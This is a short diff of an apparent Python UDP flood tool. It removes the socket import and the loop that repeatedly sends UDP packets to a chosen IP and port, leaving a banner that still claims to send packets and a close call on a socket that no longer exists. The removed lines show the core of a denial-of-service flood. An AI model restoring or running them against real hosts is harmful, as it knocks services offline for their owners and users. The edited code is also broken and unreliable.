@@ -13,8 +13,6 @@
 import os
 import random
 import sys
-import socket
-import threading
 
 # Clear the terminal
 os.system('clear' if os.name == 'posix' else 'cls')
@@ -25,11 +23,6 @@ def run(ip_run, port_run, times_run, threads_run):
     try:
         while True:
             print("\033[1;31m[*]\033[0m \033[1mSending UDP packets to\033[0m "f"\033[1;38;2;255;100;100m{ip_run}\033[0m"":"f"\033[1;38;2;255;100;100m{port_run}\033[1;37m""!")
-            s_run = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            addr_run = (str(ip_run), int(port_run))
-
-            for x_run in range(times_run):
-                s_run.sendto(data_run, addr_run)
             s_run.close()
 
     except KeyboardInterrupt:
